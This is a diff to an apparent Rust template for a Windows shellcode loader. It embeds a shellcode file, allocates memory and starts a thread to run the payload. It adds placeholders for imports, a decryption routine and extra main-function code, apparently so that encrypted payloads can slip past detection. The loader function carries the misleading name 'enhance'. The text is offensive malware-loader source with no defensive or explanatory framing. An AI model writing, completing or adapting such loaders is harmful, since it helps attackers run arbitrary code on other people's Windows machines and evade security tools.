@@ -6,9 +6,11 @@ use windows::Win32::System::Threading::CreateThread;
 use windows::Win32::System::Threading::WaitForSingleObject;
 use windows::Win32::System::Threading::THREAD_CREATION_FLAGS;
 use std::include_bytes;
+{{IMPORTS}}
 
+{{DECRYPTION_FUNCTION}}
 
-fn enhance(buf: &[u8]) {
+fn enhance(buf: &Vec<u8>) {
     unsafe {
         let alloc = VirtualAlloc(None, buf.len(), MEM_COMMIT, PAGE_READWRITE);
         let alloc_ptr: *mut u8 = alloc as *mut u8;
@@ -29,5 +31,10 @@ fn enhance(buf: &[u8]) {
 }
 fn main() {
     let buf = include_bytes!({{PATH_TO_SHELLCODE}});
-    enhance(buf);
+    let mut vec: Vec<u8> = Vec::new();
+    for i in buf.iter() {
+        vec.push(*i);
+    }
+    {{MAIN}}
+    enhance(&vec);
 }
